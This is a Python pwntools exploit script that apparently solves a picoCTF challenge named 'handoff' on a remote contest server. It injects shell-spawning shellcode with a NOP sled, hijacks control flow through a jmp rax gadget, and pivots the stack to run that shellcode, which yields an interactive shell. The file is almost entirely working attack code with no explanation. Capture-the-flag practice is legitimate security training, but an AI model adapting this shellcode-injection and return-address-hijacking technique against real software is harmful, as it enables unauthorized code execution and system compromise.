from pwn import *

exe = "./handoff"
context.update(arch="amd64", os="linux", log_level="error", binary=exe)

elf = context.binary
shellcode = asm(shellcraft.sh())

# ==================================================================

# io = process()
io = remote("shape-facility.picoctf.net", 54353)

io.sendline(b"1\nsilentzero\n2\n0")

payload = b"\x90" * (63 - len(shellcode))
payload += shellcode
io.sendline(payload)
io.sendline(b"3")

# ==================================================================

jmp_rax = p64(0x40116C)

payload = asm(
    """
nop;
sub rsp, 0x2e8;
jmp rsp;
"""
)

payload += b"\x90" * 10
payload += jmp_rax

io.sendline(payload)
io.interactive()

# diff = 0x2E8
